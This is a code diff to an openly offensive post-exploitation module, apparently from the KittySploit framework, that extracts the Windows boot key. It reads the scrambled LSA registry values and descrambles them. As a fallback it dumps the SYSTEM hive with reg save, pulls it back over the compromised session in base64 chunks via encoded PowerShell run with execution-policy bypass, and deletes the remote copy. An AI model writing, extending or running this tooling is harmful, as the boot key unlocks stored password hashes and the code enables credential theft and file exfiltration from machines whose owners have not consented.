@@ -10,7 +10,16 @@ from kittysploit import *
 import struct
 import hashlib
 import base64
+import os
 import re
+import tempfile
+
+from lib.windows.registry_bootkey import (
+    LSA_CLASS_VALUE_NAMES,
+    bootkey_from_system_hive,
+    descramble_bootkey,
+    parse_reg_query_binary,
+)
 
 # Try to import crypto libraries
 try:
@@ -109,11 +118,77 @@ class Module(Post):
         except Exception as e:
             print_warning(f"Command failed: {str(e)}")
             return ""
+
+    def _encode_powershell(self, script: str) -> str:
+        return base64.b64encode(script.encode("utf-16le")).decode("ascii")
+
+    def _run_powershell(self, script: str) -> str:
+        encoded = self._encode_powershell(script)
+        return self._execute_cmd(
+            "powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand " + encoded
+        )
+
+    def _ps_single_quote(self, value: str) -> str:
+        return str(value).replace("'", "''")
+
+    def _remote_file_size(self, path: str) -> int:
+        pq = self._ps_single_quote(path)
+        ps = f"(Get-Item -LiteralPath '{pq}').Length"
+        out = self._run_powershell(ps).strip()
+        if not out:
+            return 0
+        tail = out.splitlines()[-1].strip()
+        try:
+            return int(tail)
+        except ValueError:
+            digits = re.sub(r"\D", "", tail)
+            return int(digits) if digits else 0
+
+    def _read_remote_chunk_b64(self, path: str, offset: int, length: int) -> bytes:
+        pq = self._ps_single_quote(path)
+        ps = f"""$fs = [IO.File]::OpenRead('{pq}')
+try {{
+  $null = $fs.Seek({int(offset)}, [IO.SeekOrigin]::Begin)
+  $buf = New-Object byte[] {int(length)}
+  $n = $fs.Read($buf, 0, {int(length)})
+  if ($n -le 0) {{ '' }} else {{ [Convert]::ToBase64String($buf, 0, $n) }}
+}} finally {{
+  $fs.Close()
+}}"""
+        out = self._run_powershell(ps)
+        clean = re.sub(r"\s+", "", out)
+        if not clean:
+            return b""
+        return base64.b64decode(clean)
+
+    def _pull_file_via_session(self, remote_path: str, local_path: str, chunk_kb: int = 256) -> bool:
+        size = self._remote_file_size(remote_path)
+        if size <= 0:
+            print_error(f"Remote file is missing or empty: {remote_path}")
+            return False
+
+        chunk = max(1024, int(chunk_kb) * 1024)
+        parts = []
+        offset = 0
+        while offset < size:
+            n = min(chunk, size - offset)
+            blob = self._read_remote_chunk_b64(remote_path, offset, n)
+            if len(blob) != n:
+                print_error(f"Chunk read mismatch at offset {offset}")
+                return False
+            parts.append(blob)
+            offset += n
+
+        parent = os.path.dirname(os.path.abspath(local_path))
+        if parent:
+            os.makedirs(parent, exist_ok=True)
+        with open(local_path, "wb") as f:
+            f.write(b"".join(parts))
+        return True
     
     def _read_registry_value(self, key_path: str, value_name: str = "") -> bytes:
         """Read a registry value and return as bytes"""
         try:
-            # Use reg query to read registry value
             if value_name:
                 cmd = f'shell reg query "{key_path}" /v "{value_name}"'
             else:
@@ -122,21 +197,21 @@ class Module(Post):
             output = self._execute_cmd(cmd)
             if not output:
                 return None
-            
-            # Parse reg query output
-            # Format: "    value_name    REG_BINARY    hex_data"
+
+            if value_name:
+                parsed = parse_reg_query_binary(output, value_name)
+                if parsed is not None:
+                    return parsed
+
             lines = output.split('\n')
             for line in lines:
-                if 'REG_BINARY' in line or 'REG_SZ' in line:
-                    # Extract hex data
+                if 'REG_BINARY' in line:
                     parts = line.split()
                     if len(parts) >= 3:
-                        # Try to find hex data
-                        hex_data = parts[-1]
+                        hex_data = ''.join(parts[2:])
                         try:
-                            # Convert hex string to bytes
                             return bytes.fromhex(hex_data.replace(' ', ''))
-                        except:
+                        except ValueError:
                             pass
             
             return None
@@ -182,43 +257,59 @@ class Module(Post):
             print_warning(f"Failed to read registry key: {e}")
             return {}
     
+    def _capture_boot_key_powershell(self) -> bytes:
+        """Read LSA class values via PowerShell (handles REG_BINARY cleanly)."""
+        ps = """
+$p = Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' `
+  -ErrorAction Stop
+$names = @('JD','Skew1','GBG','Data')
+$hex = foreach ($n in $names) {
+  if (-not $p.$n) { throw "missing $n" }
+  [BitConverter]::ToString([byte[]]$p.$n).Replace('-','')
+}
+$hex -join ':'
+"""
+        out = self._run_powershell(ps).strip()
+        if not out:
+            return None
+        line = out.splitlines()[-1].strip()
+        parts = []
+        try:
+            for segment in line.split(":"):
+                parts.append(bytes.fromhex(segment))
+        except ValueError:
+            return None
+        if len(parts) != 4:
+            return None
+        try:
+            return descramble_bootkey(parts)
+        except (ValueError, TypeError):
+            return None
+
     def _capture_boot_key(self) -> bytes:
         """Capture the boot key from SYSTEM registry"""
         print_info("[*] Obtaining the boot key...")
         
         try:
-            # Boot key is stored in SYSTEM\CurrentControlSet\Control\Lsa
-            # We need to read multiple values and combine them
+            key_path = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
             boot_key_parts = []
-            
-            # Read the scrambled boot key parts
-            for i in range(4):
-                key_path = f"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
-                value_name = f"JD"
-                if i > 0:
-                    value_name = f"Skew{i}"
-                
+            for value_name in LSA_CLASS_VALUE_NAMES:
                 data = self._read_registry_value(key_path, value_name)
                 if data:
                     boot_key_parts.append(data)
-            
+
             if len(boot_key_parts) < 4:
-                # Try alternative method: use reg save and download
-                print_info("[*] Attempting alternative method to get boot key...")
+                print_info("[*] reg query incomplete — trying PowerShell...")
+                boot_key = self._capture_boot_key_powershell()
+                if boot_key:
+                    print_success(f"[+] Boot key: {boot_key.hex()}")
+                    return boot_key
+                print_info("[*] Attempting offline SYSTEM hive...")
                 return self._capture_boot_key_alternative()
-            
-            # Combine and descramble the boot key
-            boot_key = bytearray(16)
-            descramble_map = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
-            
-            for i in range(16):
-                part_idx = i // 4
-                byte_idx = i % 4
-                if part_idx < len(boot_key_parts) and byte_idx < len(boot_key_parts[part_idx]):
-                    boot_key[descramble_map[i]] = boot_key_parts[part_idx][byte_idx]
-            
+
+            boot_key = descramble_bootkey(boot_key_parts)
             print_success(f"[+] Boot key: {boot_key.hex()}")
-            return bytes(boot_key)
+            return boot_key
             
         except Exception as e:
             print_error(f"Failed to capture boot key: {e}")
@@ -227,19 +318,29 @@ class Module(Post):
     def _capture_boot_key_alternative(self) -> bytes:
         """Alternative method to get boot key using reg save"""
         try:
-            # Save SYSTEM hive to temp file
-            temp_file = "C:\\Windows\\Temp\\system_hive.tmp"
-            cmd = f'shell reg save HKLM\\SYSTEM "{temp_file}"'
-            output = self._execute_cmd(cmd)
-            
-            if "The operation completed successfully" not in output:
+            temp_file = "C:\\Windows\\Temp\\ks_system_hive.save"
+            cmd = f'shell reg save HKLM\\SYSTEM "{temp_file}" /y'
+            self._execute_cmd(cmd)
+            if self._remote_file_size(temp_file) <= 0:
                 print_error("Failed to save SYSTEM hive")
                 return None
-            
-            # For now, return None to indicate we need a different approach
-            print_warning("[!] Direct registry parsing not fully implemented")
-            print_warning("[!] This module requires direct registry API access")
-            return None
+
+            local_fd, local_path = tempfile.mkstemp(prefix="ks_system_", suffix=".save")
+            os.close(local_fd)
+            try:
+                if not self._pull_file_via_session(temp_file, local_path):
+                    return None
+                with open(local_path, "rb") as f:
+                    hive = f.read()
+                boot_key = bootkey_from_system_hive(hive)
+                print_success(f"[+] Boot key (offline hive): {boot_key.hex()}")
+                return boot_key
+            finally:
+                self._execute_cmd(f'shell del /f /q "{temp_file}"')
+                try:
+                    os.unlink(local_path)
+                except OSError:
+                    pass
             
         except Exception as e:
             print_error(f"Alternative boot key capture failed: {e}")
